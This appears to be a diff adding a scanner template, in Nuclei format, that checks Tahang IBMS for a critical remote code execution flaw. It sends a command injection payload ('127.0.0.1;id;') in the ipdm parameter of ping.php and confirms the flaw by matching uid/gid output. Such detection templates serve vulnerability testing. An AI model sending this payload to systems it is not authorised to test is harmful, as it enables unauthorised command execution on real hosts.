@@ -1,0 +1,26 @@
+id: tahang-ibms-rce
+
+info:
+  name: Tahang IBMS - Remote Code Execution
+  author: qwtd
+  severity: critical
+  description: |
+    Tahang IBMS contains a remote code execution vulnerability.
+  tags: 汉塔科技上网行为管理系统
+
+http:
+  - raw:
+      - |
+        GET /dgn/dgn_tools/ping.php?ipdm=127.0.0.1;id;&ps=64&cnt=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
+
+      - type: status
+        status:
+          - 200
